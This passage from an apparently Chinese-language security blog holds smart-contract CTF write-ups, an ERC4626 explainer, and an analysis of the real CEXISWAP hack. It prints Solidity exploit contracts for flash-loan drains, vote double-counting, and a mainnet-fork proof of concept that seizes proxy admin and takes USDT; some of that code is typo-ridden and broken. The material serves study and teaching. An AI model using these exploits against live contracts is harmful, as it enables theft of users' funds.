amount) external returns (uint);</span><br><span class="line">    function removeAllLiquidity() external returns (uint, uint);</span><br><span class="line">    function approve(address, uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// @dev Exploiter contract for SafuPool</span><br><span class="line">contract SwapperExploiter &#123;</span><br><span class="line"></span><br><span class="line">    IUniswapV2Pair pair;</span><br><span class="line">    ISafuPool safuPool;</span><br><span class="line">    IERC20 usdc;</span><br><span class="line">    IERC20 safu;</span><br><span class="line"></span><br><span class="line">    /// @dev Runs exploit, flashloan borrows Uniswap USDC liq</span><br><span class="line">    function runExploit(</span><br><span class="line">        address _uniswapPair, // DAI-USDC pair</span><br><span class="line">        address _safuPool,</span><br><span class="line">        address _usdc,</span><br><span class="line">        address _safu,</span><br><span class="line">        uint256 amount // flashloan amount required</span><br><span class="line">    ) external &#123;</span><br><span class="line">        pair = IUniswapV2Pair(_uniswapPair);</span><br><span class="line">        safuPool = ISafuPool(_safuPool);</span><br><span class="line">        usdc = IERC20(_usdc);</span><br><span class="line">        safu = IERC20(_safu);</span><br><span class="line"></span><br><span class="line">        usdc.approve(address(safuPool),type(uint256).max);</span><br><span class="line">        safu.approve(address(safuPool),type(uint256).max);</span><br><span class="line"></span><br><span class="line">        pair.swap(amount,0,address(this),bytes(&#x27;not empty&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /// @dev Uniswap flashloan callback</span><br><span class="line">    /// @dev Swaps done in batches b/c extra fees for large swaps</span><br><span class="line">    function uniswapV2Call(</span><br><span class="line">        address _sender, </span><br><span class="line">        uint256 _amount0, // usdc</span><br><span class="line">        uint256 _amount1,</span><br><span class="line">        bytes calldata _data</span><br><span class="line">    ) external &#123;</span><br><span class="line">        require(msg.sender == address(pair), &#x27;callback&#x27;);</span><br><span class="line"></span><br><span class="line">        for (uint i=0; i&lt;5; ++i) &#123;</span><br><span class="line">            safuPool.swap(address(safu),8_000*1e18); // get some SAFU tokens</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 safuAmount = safu.balanceOf(address(this));</span><br><span class="line">        safuPool.addLiquidity(safuAmount, safuAmount); // add equal parts tokens for liq</span><br><span class="line"></span><br><span class="line">        for (uint i=0; i&lt;5; ++i) &#123;</span><br><span class="line">            safuPool.swap(address(safu),8_000*1e18); // get more SAFU tokens</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        safuAmount = safu.balanceOf(address(this));</span><br><span class="line">        safu.transfer(address(safuPool),safuAmount); // transfer all SAFU</span><br><span class="line">        usdc.transfer(address(safuPool),600_000*1e18); // transfer large amount of USDC</span><br><span class="line"></span><br><span class="line">        safuPool.removeAllLiquidity(); // effectively double counts the transfers done earlier</span><br><span class="line">        safuPool.addLiquidity(0,0); // get LP which is the double counted</span><br><span class="line">        safuPool.removeAllLiquidity(); // get base funds for the double counted LP</span><br><span class="line"></span><br><span class="line">        uint256 amountPerRound = safu.balanceOf(address(this)) / 10;</span><br><span class="line"></span><br><span class="line">        for (uint i=0; i&lt;10; ++i) &#123;</span><br><span class="line">            safuPool.swap(address(usdc), amountPerRound); // dump remaining SAFU for USDC</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 loanPlusInterest = (_amount0*(10**18)*1000/997/(10**18))+1; // exact amount owed</span><br><span class="line">        usdc.transfer(msg.sender,loanPlusInterest); // pay back flashloan</span><br><span class="line">        usdc.transfer(tx.origin,usdc.balanceOf(address(this))); // lazy</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="补充：流动池的LP计算"><a href="#补充：流动池的LP计算" class="headerlink" title="补充：流动池的LP计算"></a>补充：流动池的LP计算</h1><p>流动性池的 LP 代币计算<br>流动性池的总资产：</p><p>假设流动性池中有 baseAmount（例如 SAFU）和 tokenAmount（例如 USDC）。<br>在正常情况下，LP 代币的铸造与流动性池的资产状态是直接关联的。<br>添加流动性时的 LP 代币计算：</p><p>当用户向池中添加流动性时，会计算应铸造的 LP 代币数量，公式通常是：<br>新 LP 代币数量&#x3D;存入资产&#x2F;总资产×现有 LP 代币总数</p><p>这确保了流动性池的每个流动性提供者都根据他们的贡献获得相应比例的 LP 代币。<br>移除流动性时的 LP 代币计算：<br>当调用 removeAllLiquidity() 时，合约会根据持有的 LP 代币数量来计算用户可以提取的基础资产：<br>提取的 SAFU&#x3D;用户持有的 LP 代币&#x2F;总 LP 代币×当前 SAFU 总量<br>提取的 USDC&#x3D; 用户持有的 LP 代币&#x2F;总 LP 代币×当前 USDC 总量</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC4626</title>
      <link href="/2024/10/27/ERC4626/"/>
      <url>/2024/10/27/ERC4626/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC4626"><a href="#ERC4626" class="headerlink" title="ERC4626"></a>ERC4626</h1><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>ERC-4626 是优化和统一收益资金库技术参数的标准。 它为表示单个底层 ERC-20 代币的份额的代币化收益资金库提供标准应用程序接口。 ERC-4626 还概述了使用 ERC-20 的代币化资金库的可选扩展，提供存款、提取代币和读取余额的基本功能。</p><p>它主要是运用在收益金库中</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>asset：由 Vault 管理的基础 Token。 具有由相应的 EIP-20 合约定义的单位。<br>share：Vault 的 token。具有标的资产比率 在 Mint &#x2F; Deposit &#x2F; Withdraw&#x2F;redeem （由 Vault 定义） 时兑换。<br>fee：Vault 向用户收取的资产或份额数量。可以存在费用 存款、收益、AUM、提款或 Vault 规定的任何其他内容。<br>滑点：广告股价与经济现实之间的任何差异 存款到金库或从金库取款，不计入费用。</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>asset :<code>function asset() public view returns (address assetTokenAddress)</code><br>函数返回用于资金库记账，存款，取款的带代币地址。</p><p>totalAsset:<code>function convertToShares(uint256 assets) public view returns (uint256 shares)</code><br>函数返回资金库持有的资金总量</p><p>converToShare:<code>function convertToShares(uint256 assets) public view returns (uint256 shares)</code><br>函数返回shares的数量，该数量将由资金库兑换为提供的assets数量</p><p>convertToAssets :<code>function convertToAssets(uint256 shares) public view returns (uint256 assets)</code><br>函数返回assets数量，该数量由资金库兑换成为提供的shares数量</p><p>maxDeposit:function <code>maxDeposit(address receiver) public view returns (uint256 maxAssets)</code><br>函数返回receiver的一次deposit调用中可以存入的最大资产数量</p><p>previewDeposit:<code>function previewDeposit(uint256 assets) public view returns (uint256 shares)</code><br>函数允许用户模拟他们在当前区块的存取效果</p><p>deposit：<code>function deposit(uint256 assets, address receiver) public returns (uint256 shares)</code><br>函数将代币asserts存入资金库，并将shares的所有权授予receiver</p><p>maxMint :<code>function maxMint(address receiver) public view returns (uint256 maxShares)</code><br>函数返回receiver在单次mintd调用中可以铸造的最大份额】</p><p>previewMint：<code>function maxMint(address receiver) public view returns (uint256 maxShares)</code><br>函数允许用户在当前区块模拟他们铸币效果</p><p>mint：<code>function mint(uint256 shares, address receiver) public returns (uint256 assets)</code><br>函数通过存入代币的assets,将shares资金库份额准确的铸造搭到receiver。</p><p>maxWithdraw:<code>function maxWithdraw(address owner) public view returns (uint256 maxAssets)</code><br>函数返回可以通过单次 withdraw 调用从 owner 余额中提取的最大标的资产数量。</p><p>previewWithdraw:<code>function previewWithdraw(uint256 assets) public view returns (uint256 shares)</code><br>函数允许用户模拟他们在当前区块取款的效果</p><p>withdraw:<code>function withdraw(uint256 assets, address receiver, address owner) public returns (uint256 shares)</code><br>函数从 owner 烧录 shares，并将 assets 代币从资金库准确发送到 receiver。</p><p>maxRedeem:<code>function maxRedeem(address owner) public view returns (uint256 maxShares)</code><br>函数返回可以通过 redeem 调用从 owner 余额中赎回的最大份额。</p><p>previewRedeem:<code>function previewRedeem(uint256 shares) public view returns (uint256 assets)</code><br>函数允许用户在当前区块模拟他们的赎回效果。</p><p>redeem:<code>function redeem(uint256 shares, address receiver, address owner) public returns (uint256 assets)</code><br>函数从 owner 赎回特定数量的 shares 并将底层代币的 assets 从资金库发送到 receiver。</p><p>totalSupply：<code>function totalSupply() public view returns (uint256)</code><br>返回流通中未赎回的资金库份额总数。</p><p>balanceOf：<code>function balanceOf(address owner) public view returns (uint256)</code><br>返回 owner 当前拥有的资金库份额总量。</p><h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>使用 deposit()，你指定要存入多少资产，函数将计算要发送给你的股份数量。<br>使用 mint()，你指定想要多少股份，函数将计算从你那里转移多少 ERC20 资产。</p><p>withdraw 和 redeem 分别是 deposit 和 mint 的逆操作。</p><p>使用 deposit，你指定要交易的资产数量，合约计算你将获得多少股份。<br>使用 mint，你指定想要的股份数量，合约计算要从你那里取走多少资产。<br>同样，<br>使用 withdraw，你可以指定想从合约中提取多少资产，合约将计算你需要销毁多少股份。<br>使用 redeem，你指定想要销毁多少股份，合约将计算要返还给你的资产数量。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Flash-Loaner</title>
      <link href="/2024/10/27/CTF-Flash-Loaner/"/>
      <url>/2024/10/27/CTF-Flash-Loaner/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Flash-Loaner"><a href="#CTF-Flash-Loaner" class="headerlink" title="CTF-Flash-Loaner"></a>CTF-Flash-Loaner</h1><p>题目源码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/flash-loaner">点击</a></p><p>题目要求：<br>FlashLoaner 合约接受用户的资金以促进闪电贷，其中他们收取少量费用。这笔费用作为收益提供给储户。</p><p>您的任务是从该合约中抽走 99%+ 的用户资金。您开始时没有资金。</p><p>这题看起来就是很闪电贷。但是阅读完后，并没有发现一些漏洞，突破口就是这个代码：<code>  IFlashCallback(msg.sender).flashCallback(fee, data);</code>可是我们的回执函数能做些什么呢，除了还款我想不到其他方向了</p><p>再次审阅合约，发现这个闪电贷是继承ERC4626合约的，意味着它也可以实现存取功能，所以思路就打开了，首先借入一些代币，在调用deposit函数，存入闪电贷中，满足还款条件，然后再执行withdraw函数，又将代币撤回</p><p>攻击合约：</p><pre><code>//SPDX-License-Identifier: MITpragma solidity^0.8.17;import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;interface IUniswapV2Pair&#123;     function swap(        uint amount0Out,         uint amount1Out,         address to,         bytes calldata data    ) external;&#125;interface ILoan&#123;    function deposit(uint256 assets, address receiver) external returns (uint256);    function redeem(uint256 shares,address receiver,address owner) external returns (uint256);    function flash(address recipient,uint256 amount,bytes calldata data) external;&#125;contract Hack&#123;    IUniswapV2Pair pair;    ILoan loaner;    IERC20 udsc;    constructor(address _pair,address _loaner,address udsc)&#123;        pair = IUniswapV2Pair (_pair);        loaner = Loaner(_loaner);        udsc = IERC20(_udsc);         usdc.approve(address(loaner), type(uint).max);    &#125;    function pwn () exteranl &#123;        pair.swap(100_000e18.0.address(this),new btyes(1));        udsc.transfer(msg.sender,udsc.banlanceOf(address(tihs)));    &#125;    function uniswapV2Call (address _address,uint256 amount0,uint256 amount1,bytes memory data) exteranl&#123;        loaner.flash(address(this),udsc.balanceOf(address(loaner))-1,new bytes(0));        loaner.redeem(loaner.balanceOf(address(this)),address(this),address(this));        udsc.transfer(address(pair),(amount0*103/100)+1);    &#125;    function flashCallback(uint256 fee,byte calldata) external&#123;        loaner.deposit(100_1000e18,address(this));        udsc.transfer(address(loaner),fee);    &#125;&#125;完结。这个题和前面的ctf-bonding-curve还是有点一样的。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CEXISWAP攻击事件分析</title>
      <link href="/2024/10/27/CEXISWAP%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/27/CEXISWAP%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="攻击介绍"><a href="#攻击介绍" class="headerlink" title="攻击介绍"></a>攻击介绍</h1><p>cexiswap被黑客攻击，黑客从中盗取了3w的USDT。（CEXISWAP是一个去中心化的多链交易所，通过贸易管道技术在DEX和CEX之间桥接流动性）</p><p>TX：0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59e</p><h1 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h1><p>我们通过phalcon来看。攻击合约直接调用受害者的initialize()，使自己成为了admin，再调用受害者的upgradeToAndCall()，再upgradeToAndCall()中受害者再次delegatecall攻击合约的0x1de24bbf函数。</p><p>很明显，受害者为对initialize()进行访问限制，导致被攻击。</p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import&quot;forge-std/Test.sol&quot;;</span><br><span class="line">import&quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">// Attacker : https://etherscan.io/address/0x060c169c4517d52c4be9a1dd53e41a3328d16f04</span><br><span class="line">// Attack Contract : https://etherscan.io/address/0x8c425ee62d18b65cc975767c27c42de548d133a1</span><br><span class="line">// Vulnerable Contract : https://etherscan.io/address/0xb8a5890d53df78dee6182a6c0968696e827e3305</span><br><span class="line">// Attack Tx : 0xede72a74d8398875b42d92c550539d72c830d3c3271a7641ee1843dc105de59e</span><br><span class="line"></span><br><span class="line">interface ICEXISWAP &#123;</span><br><span class="line">    function initialize(</span><br><span class="line">        string memory name,</span><br><span class="line">        string memory ticker,</span><br><span class="line">        address _treasuryWallet,</span><br><span class="line">        address _communityWallet,</span><br><span class="line">        address _admin,</span><br><span class="line">        address _strategy</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function upgradeToAndCall(</span><br><span class="line">        address newImplementation,</span><br><span class="line">        bytes memory data</span><br><span class="line">    ) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CEXISWAPTest is Test&#123;</span><br><span class="line">    ICEXISWAP constant cexiswap = ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);</span><br><span class="line">    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);</span><br><span class="line">    Exploiter public exploiter;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        vm.createSelectFork(&quot;mainnet&quot;, 18182605);</span><br><span class="line">        vm.label(address(cexiswap), &quot;CEXISWAP&quot;);</span><br><span class="line">        vm.label(address(usdt), &quot;USDT&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testexploit() public&#123;</span><br><span class="line">        exploiter = new Exploiter();</span><br><span class="line">        exploiter.exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exploiter&#123;</span><br><span class="line">    ICEXISWAP constant cexiswap = ICEXISWAP(0xB8a5890D53dF78dEE6182A6C0968696e827E3305);</span><br><span class="line">    IUSDT constant usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);</span><br><span class="line">    bytes32 constant solt = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function exploit() public&#123;</span><br><span class="line">        cexiswap.initialize(</span><br><span class="line">            &quot;HAX&quot;,</span><br><span class="line">            &quot;HAX&quot;,</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this),</span><br><span class="line">            address(this));</span><br><span class="line">        </span><br><span class="line">        cexiswap.upgradeToAndCall( address(this),abi.encodePacked(this.exploit2.selector));</span><br><span class="line"></span><br><span class="line">        this.killMe();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit2() public&#123;</span><br><span class="line">        owner = address(this);</span><br><span class="line">        </span><br><span class="line">        usdt.transfer(owner, usdt.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      function upgradeTo(address newImplementation) external &#123;</span><br><span class="line">        bytes32 _slot = solt;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            sstore(_slot, newImplementation)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function killMe() public&#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-bonding-curve</title>
      <link href="/2024/10/27/CTF-bonding-curve/"/>
      <url>/2024/10/27/CTF-bonding-curve/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-bonding-curve"><a href="#CTF-bonding-curve" class="headerlink" title="CTF-bonding-curve"></a>CTF-bonding-curve</h1><p>题目码源：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/bonding-curve">点击</a></p><p>题目要求：<br>他们即将推出的游戏发布了两个代币合同：EMN和TOKEN，它们允许你根据各自的粘合曲线进行铸造。</p><p>DAI 用于铸造 EMN，EMN 用于铸造 TOKEN。</p><p>您的任务是窃取至少 50,000 个 DAI。您开始时没有token。</p><p>这次感觉后面的题目就上难度了，粘合曲线就是一个新知识了。</p><p>首先这个合约这个合约有点多，慢慢来分析，<code>BancorBondingCurve</code>合约实现了一个关键的债务曲线，数学知识很多，了解就行。<code>EminenceCurrency</code>合约实现了EMN-&gt;TOkEN，买入token,消耗EMN。<code>EminenceCurrencyBase</code>合约实现了DAI-&gt;EMN,买入EMN，消耗DAI，<code>EminenceCurrencyHepler</code>合约，就是对债务曲线的实现。</p><p>梳理完后，就是要获得DAI代币，而我们又没有钱，所以就只能借，那就是闪电贷的实现，这道题很容易想到套利，那么如何在买卖中获得利润，就是我们要实现了的</p><p>在<code>EminenceCurrencyBase</code>合约看到买EMN的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">function buy(uint _amount, uint _min) external returns (uint _bought) &#123;</span><br><span class="line">    _bought = _buy(_amount);</span><br><span class="line">    require(_bought &gt;= _min, &quot;slippage&quot;);</span><br><span class="line">    DAI.transferFrom(msg.sender, address(this), _amount);</span><br><span class="line">    _mint(msg.sender, _bought);</span><br><span class="line">    emit CashShopBuy(msg.sender, _bought, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来很正常<br>但是看向<code>EminenceCurrency</code>合约中买token的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claim(address _from, uint _amount) external &#123;</span><br><span class="line">       require(gamemasters[msg.sender]||npcs[msg.sender], &quot;!gm&quot;);</span><br><span class="line">       _burn(_from, _amount);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function buy(uint _amount, uint _min) external returns (uint _bought) &#123;</span><br><span class="line">       _bought = _buy(_amount);</span><br><span class="line">       require(_bought &gt;= _min, &quot;slippage&quot;);</span><br><span class="line">       EMN.claim(msg.sender, _amount);</span><br><span class="line">       _mint(msg.sender, _bought);</span><br><span class="line">       emit CashShopBuy(msg.sender, _bought, _amount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>发现还是有点区别的，一个是实现DAI的转账，一个是实现EMN的销毁，那么自身的EMN销毁后，对于债务曲线还是有影响的。<br>所以一个套利思路就有了：首先使用闪电贷，借入DAI，然后用全部的DAI购买EMN，再在闪电贷执行回调函数的函数的时候，拿出一部分的EMN进行购买token,这样市场的EMN就会被销毁，那么就影响到了此时的EMN的价格，然后在通过swap把token交换成EMN，我们在进行高价出售EMN，就能获得更多的DAI，然后还钱，剩下的DAI就归我们所有。</p><p>攻击合约如下：</p><pre><code>//SPDX-License-Identifier:MITpragma solidity ^0.8.17;//因为需要闪电贷，使用unisawpV2来进行interface IUinswapV2Pair&#123;  function swap(uint amount0,uint amoun2,address to,bytes calldata data) exteranl;&#125;interface IEminceCurrency&#123;    function buy(uint _amount, uint _min) external returns (uint _bought);     function sell(uint _amount, uint _min) external returns (uint _bought) ;&#125;interface TokenERC20&#123;  function balanceOf(address token) exteranl ; function approve(address spender, uint256 amount) external ;&#125;contract Hack&#123;    IUniswapV2Pair pair;    IEminceCurrency buyemn;    IEminceCurrency buytoken;    TokenERC20 dai     constructor(address _pair,address _buyemn;address buytoken,address _dai)    &#123;        pair = IUniswapV2Pair(_pair);        buyemn = IEminceCurrency(_buyemn);        buytoken = IEminceCurrency(_buytoken);        dai = TokenERC20(_dai);    &#125;   function pwn (uint256 amount) exteranl &#123;    pair.swap(0,amount,address(this),bytes())   &#125;   function uiswapV2call (address _sender,uint256 amount0,uint256 amount1,bytes calldata _data) exteranl &#123;        uint256 daiamount =dai.balanceOf(address(this));        dai.approve(address(buyemn),type.(uint256).max);        dai.approve(address(buytoken),type(uint256).max);         //买入EMN；        uint256 buy1amount = buyemn.buy(daiamount,0);        //用1/2的EMN，买入token，此时会销毁EMN，导致EMN的价格额升高        uint256 buy2amount = buytoken.buy(buy1amount/2,0);        //出售EMN        uint256 sell1amount = buyemn.sell(buy1amount/2,0);        //出售token获得EMN        uint256 sell2amount = buytoken.sell(buy2amount,0);        //出售剩下的EMN        uint256 sell3amount = buyemn.sell(sell2amount,0);        uint256 daitotal = sell1amount + sell3amount;        //还本金加利息        uint256 returnamount = (amount1*(10**18)*1000/997/(10**18))+1;        dai.transfer (msg.sender,returnamount);        //将剩下的dai发送给我们自己        dai.transfer(tx.origin,(daitotal-returnamount));   &#125;&#125;完结，个人认为，就是首先，要想到使用闪电贷，使用套利，发现漏洞的存在。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-governance-shenamigans</title>
      <link href="/2024/10/25/CTF-governance-shenamigans/"/>
      <url>/2024/10/25/CTF-governance-shenamigans/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-governance-shenamigans"><a href="#CTF-governance-shenamigans" class="headerlink" title="CTF-governance-shenamigans"></a>CTF-governance-shenamigans</h1><p>题目源码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/governance-shenanigans">点击</a></p><p>要求是;<br>NotSushiToken 治理代币合约已经上线，旨在决定谁是最佳寿司厨师。谁不想要这样的荣耀呢？<br>该合约只允许 WLed 地址投票。幸运的是，你的 Sybil 攻击让你获得了 3 个可以投票的 WLed 地址。<br>你的目标是获得最多的委托投票，成为真正的寿司之王。你手中有 500 个代币，而你的竞争对手有 2000 个。</p><p>从题目中就可以得到一点方向，就是有3个可以投票的地址，说明我们肯定要运用起来</p><p>整个合约的逻辑就是委托投票，那么如果，我们将原有的500 个代币，委托给那3个地址，给我们投票，那么我们不就有很多票了吗</p><p>看向代码，允许我们这么做吗</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _delegate(address delegator, address delegatee)</span><br><span class="line">       internal</span><br><span class="line">   &#123;</span><br><span class="line">       address currentDelegate = _delegates[delegator];</span><br><span class="line">       uint256 delegatorBalance = balanceOf(delegator); // balance of underlying SUSHIs (not scaled);</span><br><span class="line">       _delegates[delegator] = delegatee;</span><br><span class="line"></span><br><span class="line">       emit DelegateChanged(delegator, currentDelegate, delegatee);</span><br><span class="line"></span><br><span class="line">       _moveDelegates(currentDelegate, delegatee, delegatorBalance);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   /// @dev votes are transfered from delegatee `srcRep` to `dstRep`</span><br><span class="line">   function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal &#123;</span><br><span class="line">       if (srcRep != dstRep &amp;&amp; amount &gt; 0) &#123;</span><br><span class="line">           if (srcRep != address(0)) &#123;</span><br><span class="line">               // decrease old representative</span><br><span class="line">               uint32 srcRepNum = numCheckpoints[srcRep];</span><br><span class="line">               uint256 srcRepOld = srcRepNum &gt; 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;</span><br><span class="line">               uint256 srcRepNew = srcRepOld.sub(amount);</span><br><span class="line">               _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           if (dstRep != address(0)) &#123;</span><br><span class="line">               // increase new representative</span><br><span class="line">               uint32 dstRepNum = numCheckpoints[dstRep];</span><br><span class="line">               uint256 dstRepOld = dstRepNum &gt; 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;</span><br><span class="line">               uint256 dstRepNew = dstRepOld.add(amount);</span><br><span class="line">               _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>发现没有什么限制，就能更新 <code>_delegates[delegator] = delegatee</code> 代表者,  也就是说刚刚那个想法就可实现</p><p>攻击思路：<br>三个地址，attracker,B,C,<br>attracter发送500代币给B，B在委托给attracker,  此时attracker的投票数500；<br>B将500代币发送给C，C在委托给attracker,此此时attrcaker的投票数为1000；<br>C将500代币发送给attracker,attracker在再重复前面的工作，直至投票数超过2000；</p><p>个人认为,这个合约漏洞是，可以随意更新代表者，并且委托人的token会留在它自己这儿，就好像双花一样，代币被重复使用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-MasterChef</title>
      <link href="/2024/10/25/CTF-MasterChef/"/>
      <url>/2024/10/25/CTF-MasterChef/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-MasterChef"><a href="#CTF-MasterChef" class="headerlink" title="CTF-MasterChef"></a>CTF-MasterChef</h1><p>题目源码;<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/inflationary-net-worth">点击</a></p><p>要求是：<br>有一个 MasterChef 合约，它接受 MULA 代币并向质押者铸造 MUNY 作为奖励。</p><p>MULA 具有通缩转账税机制，每次转账会销毁 5% 的数量，以有效激励长期持有者。</p><p>你的任务是欺骗 MasterChef，使其为你铸造分配给所有质押者的所有 MUNY。你开始时拥有 10,000 MULA。</p><p>看到有源代码，和之前的质押合约很像，存款获得奖励，而我们就是要获得这个MdsterChef合约中全部的奖励，看到题目说有5%的手续费，初步想法就是会不会是溢出啥的，但是看到存取代码时，我并没有看见有对5%的手续费的说明</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//_pid是流动池的ID</span><br><span class="line"> function deposit(uint256 _pid, uint256 _amount) public &#123;</span><br><span class="line">        PoolInfo storage pool = poolInfo[_pid];</span><br><span class="line">        UserInfo storage user = userInfo[_pid][msg.sender];</span><br><span class="line">        updatePool(_pid);</span><br><span class="line">        if (user.amount &gt; 0) &#123;</span><br><span class="line">            uint256 pending =</span><br><span class="line">                user.amount.mul(pool.accMunyPerShare).div(1e12).sub(</span><br><span class="line">                    user.rewardDebt</span><br><span class="line">                );</span><br><span class="line">            safeMunyTransfer(msg.sender, pending);</span><br><span class="line">        &#125;</span><br><span class="line">        pool.lpToken.safeTransferFrom(</span><br><span class="line">            address(msg.sender),</span><br><span class="line">            address(this),</span><br><span class="line">            _amount</span><br><span class="line">        );</span><br><span class="line">        user.amount = user.amount.add(_amount);</span><br><span class="line">        user.rewardDebt = user.amount.mul(pool.accMunyPerShare).div(1e12);</span><br><span class="line">        emit Deposit(msg.sender, _pid, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Withdraw LP tokens from MasterChef.</span><br><span class="line">    function withdraw(uint256 _pid, uint256 _amount) public &#123;</span><br><span class="line">        PoolInfo storage pool = poolInfo[_pid];</span><br><span class="line">        UserInfo storage user = userInfo[_pid][msg.sender];</span><br><span class="line">        require(user.amount &gt;= _amount, &quot;withdraw: not good&quot;);</span><br><span class="line">        updatePool(_pid);</span><br><span class="line">        uint256 pending =</span><br><span class="line">            user.amount.mul(pool.accMunyPerShare).div(1e12).sub(</span><br><span class="line">                user.rewardDebt</span><br><span class="line">            );</span><br><span class="line">        safeMunyTransfer(msg.sender, pending);</span><br><span class="line">        user.amount = user.amount.sub(_amount);</span><br><span class="line">        user.rewardDebt = user.amount.mul(pool.accMunyPerShare).div(1e12);</span><br><span class="line">        pool.lpToken.safeTransfer(address(msg.sender), _amount);</span><br><span class="line">        emit Withdraw(msg.sender, _pid, _amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那么是不是就可以执行循环存取款，（题目也说了我们有10,000 MULA），获得奖励</p><p>攻击思路：就是通过循环存取款，获得奖励（注意，因为MulaToken合约中有自带的损失5%，所以最后攻击者还是的损失代币，不过是题目初始的，并不用担心）</p><p>其他的不用去纠结那么多，就是考察这个货币有没有通货紧缩代币支持</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC721</title>
      <link href="/2024/10/25/ERC721/"/>
      <url>/2024/10/25/ERC721/</url>
      
